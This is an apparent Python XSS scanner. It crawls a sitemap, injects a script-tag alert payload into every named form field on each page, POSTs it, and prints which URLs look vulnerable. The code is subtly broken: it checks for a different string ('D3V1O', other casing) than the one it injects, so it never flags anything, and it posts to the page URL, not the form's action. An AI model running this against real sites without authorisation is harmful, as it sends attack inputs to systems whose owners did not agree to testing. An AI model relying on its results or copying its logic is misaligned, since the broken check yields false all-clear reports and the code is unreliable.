import requests
import time
from bs4 import BeautifulSoup

def test_form_xss(form_url):
    # Make a GET request to the form URL
    response = requests.get(form_url)

    # Parse the response HTML using BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all the input fields in the form
    inputs = soup.find_all('input')

    # Create a dictionary of input field values, with the input field names as keys
    data = {}
    for input in inputs:
        if 'name' in input.attrs:
            data[input['name']] = '<sCrIpT>alert("XSS")</ScRiPt>'

    # Make a POST request to the form URL with the modified input field values
    response = requests.post(form_url, data=data)

    # Check if the XSS payload was executed in the response
    if '<ScRiPt>alert("D3V1O")</sCrIpT>' in response.text:
        return True
    else:
        return False

# Define a function to crawl a sitemap and return a list of URLs
def crawl_sitemap(sitemap_url):
    # Use requests to get the sitemap XML
    response = requests.get(sitemap_url)

    # Use BeautifulSoup to parse the XML using the lxml parser
    soup = BeautifulSoup(response.text, 'lxml-xml')

    # Create an empty list to store the URLs
    urls = []

    # Loop through each <loc> tag in the sitemap
    for loc_tag in soup.find_all('loc'):
        # Get the URL from the <loc> tag
        url = loc_tag.text

        # Check if the URL ends in jpg or png
        if not url.endswith(('jpg', 'png', 'gif', 'jpeg', 'webp', 'svg')):
            # Add the URL to the list
            urls.append(url)

    # Return the list of URLs
    return urls

# Define a list of sitemap URLs
sitemap_urls = [
    'https://www.example.com/page-sitemap.xml',
]

# Create an empty list to store all URLs from all sitemaps
all_urls = []

# Loop through each sitemap URL
for sitemap_url in sitemap_urls:
    print("Getting all URL's from provided sitemap URL's ...")
    time.sleep(0.2)
    # Crawl the sitemap and add the URLs to the all_urls list
    all_urls += crawl_sitemap(sitemap_url)

index = 0
vulns = 0
vuln_list = []

print("Starting to check each URL for xss vulnerabilities ...")

# Check each URL for xss vulnerabilities.
for url in all_urls:
    index += 1
    is_vulnerable = test_form_xss(url)

    if is_vulnerable == True:
        vuln = "[+]"
        vulns += 1
        vuln_list.append(url)
    else:
        vuln = "[-]"

    print(f'{vuln} {url}')

print(f'Checked URLS: {index}')
print(f'Vulnerable URLS: {vulns}')

print(vuln_list)